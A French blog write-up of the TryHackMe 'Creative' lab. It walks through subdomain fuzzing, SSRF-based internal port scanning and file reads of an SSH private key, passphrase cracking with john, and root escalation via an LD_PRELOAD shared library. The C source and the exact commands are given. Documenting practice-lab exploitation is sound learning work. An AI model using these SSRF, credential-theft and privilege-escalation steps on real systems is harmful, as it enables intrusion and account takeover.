---
date: 2024-04-17T22:14:41-05:00
# description: ""
image: "/images/THM-Creative/Creative.svg"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Creative"
type: "post"
---

* Platform: TryHackMe
* Link: [Creative](https://tryhackme.com/r/room/creative)
* Level: Easy
* OS: Linux
---

* Platforme: TryHackMe
* Lien: [Creative](https://tryhackme.com/r/room/creative)
* Niveau: Facile
* OS: Linux
---

Ce défi commence par un site web statique qui n'est pas exploitable. L'énumération des sous-domaines permet de découvrir une application de test d'URL vulnérable au SSRF. Cependant, l'exploitation complète n'est possible qu'après la découverte d'un port exposé en interne. Cet accès permet de lire des fichiers sur le serveur, ce qui conduit à la récupération d'une clé privée SSH. Mais cela ne suffit pas pour établir un point d'ancrage. Une fois la clé SSH obtenue, le hash est craqué, donnant accès au système cible. Enfin, une élévation de privilèges est réalisée en exploitant la variable d'environnement `LD_PRELOAD`.

Adresse IP cible - `10.10.119.61`

## Scanning 

```
nmap -sC -sV -oA nmap/Creative 10.10.119.61
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 20:52 CDT
Nmap scan report for 10.10.119.61
Host is up (0.27s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.97 seconds
```

Nous avons deux ports ouverts, 22 (SSH) et 80 (Nginx). Nous sommes redirigés vers `http://creative.thm`.

```
sudo echo "10.10.119.61 creative.thm" | sudo tee -a /etc/hosts
```

## Enumération

Le site web semble plutôt simple, sans aucun élément exploitable. 

L'énumération des répertoires et l'examen du code source ne donnent rien.

En utilisant ffuf pour l'énumération des sous-domaines, nous trouvons `beta`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fc 404 -t 100 -u http://creative.thm -H "Host: FUZZ.creative.thm" -ic -fs 178
```

![Beta subdomain found](/images/THM-Creative/beta-subdomain.png)

Après l'avoir ajouté au fichier `/etc/hosts`, nous le visitons et il s'avère être un testeur d'URL.

![URL tester website](/images/THM-Creative/beta-url-tester.png)

En soumettant `http://127.0.0.1:80`, on retrouve le contenu de la page principale sans le style, ce qui fait penser à SSRF.

![URL tester SSRF 1](/images/THM-Creative/url-test.png)

Une tentative avec l'url `http://creative.thm/etc/passwd` ne fonctionne pas et renvoie `Dead`.

![File read attempt failed](/images/THM-Creative/file-read-fail.png)

### Balayage des ports internes via SSRF

Essayons de découvrir les ports internes ouverts sur la cible.

```
ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13
```

![Internal ports fuzzing](/images/THM-Creative/ffuf-cmd.png)

Le port `1337` est découvert, en soumettant `http://127.0.0.1:1337/` nous pouvons lister les répertoires sur le serveur.

![Directories on the server](/images/THM-Creative/server-directories.png)

Avec Burp, nous explorons le système de fichiers et examinons ce que nous pouvons y trouver. Allons dans `/home`.

![Home directory via SSRF](/images/THM-Creative/home-dir.png)

Dans `/home` nous trouvons un répertoire pour `saad`. En allant plus loin avec `http://127.0.0.1:1337/home/saad/` nous découvrons le dossier `.shh` et le drapeau de l'utilisateur `user.txt`. 

Il suffit d'utiliser `http://127.0.0.1:1337/home/saad/user.txt` pour révéler le premier drapeau.

## Accès Initial

En soumettant `http://127.0.0.1:1337/home/saad/.ssh/id_rsa` nous pouvons récupérer la clé SSH de l'utilisateur.

![saad user SSH key](/images/THM-Creative/saad-ssh-key.png)

> N'oubliez pas de configurer les permissions correctes sur la clé avec `chmod 600`.

La tentative de connexion via SSH échoue parce que nous avons besoin de la phrase secrète de l'utilisateur.

```
ssh saad@creative.thm -i id_rsa
```
![SSH login failed](/images/THM-Creative/ssh-fail.png)

Nous pouvons utiliser `john` pour la trouver en convertissant la clé en un hash craquable.

```
ssh2john id_rsa > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Hash cracking to recover passphrase](/images/THM-Creative/passphrase.png)

Elle est trouvée et nous pouvons maintenant nous connecter.

![Initial foothold via SSH login](/images/THM-Creative/foothold.png)

## Elévation de Privilèges

Une des choses que nous devrions toujours vérifier est le fichier `.bash_history`. Il révèle le mot de passe du compte `saad`.

![Account password recovered](/images/THM-Creative/system-password.png)

Avec ce mot de passe, nous pouvons lancer `sudo -l`. L'utilisateur est capable de lancer `/usr/bin/ping` en tant que root.

![Sudo -l command](/images/THM-Creative/sudo-l.png)

Il n'y a pas grand chose à faire avec `ping`. Nous pourrions essayer de remplacer le binaire par un binaire malveillant si nous avions les droits d'écriture sur `/usr/bin/` mais ce n'est pas le cas, tous les fichiers appartiennent à root.

![Ping binary permissions](/images/THM-Creative/ping-binary.png)

Notre prochaine piste est la variable d'environnement `LD_PRELOAD`.

> La mention `env_keep+=LD_PRELOAD` dans la configuration sudo suggère que `saad` est autorisé à préserver la variable d'environnement `LD_PRELOAD` lors de l'exécution des commandes sudo. Cela pourrait potentiellement être utilisé pour charger des bibliothèques partagées malveillantes.


`LD_PRELOAD` est une variable d'environnement sous Linux et d'autres systèmes d'exploitation de type Unix. Elle permet à l'utilisateur de spécifier une liste de bibliothèques partagées supplémentaires à précharger avant toutes les autres lors de l'exécution d'un programme.

Un excellent article sur `Linux Privilege Escalation using LD_Preload` est disponible [ici](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/). 

1. Nous créons un fichier `shell.c` dans `/tmp`

```
cd /tmp
nano shell.c 
```

Ci-dessous le contenu de mon fichier, j'ai modifié celui de l'article qui me posait des problèmes lors de la compilation.

```C
#include <stdio.h>
#include <unistd.h> // Include this header for setuid() and setgid() functions
#include <stdlib.h>

void _init() 
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

2. Nous compilons et lions `shell.c` dans une bibliothèque partagée nommée `shell.so`

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![Shared library permissions](/images/THM-Creative/shared-library.png)

3. Enfin, nous exécutons la commande `ping` avec la variable d'environnement `LD_PRELOAD` fixée à `/tmp/shell.so` et nous accédons à root.

```
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

![Privilege escalation and root flag](/images/THM-Creative/root-flag.png)

Ce challenge était assez simple, montrant comment une vulnérabilité peut conduire à une chaîne d'exploitation. Il a également mis en évidence la façon dont les mauvaises configurations peuvent être utilisées à l'avantage d'un attaquant. En attendant le prochain, continuez à apprendre!
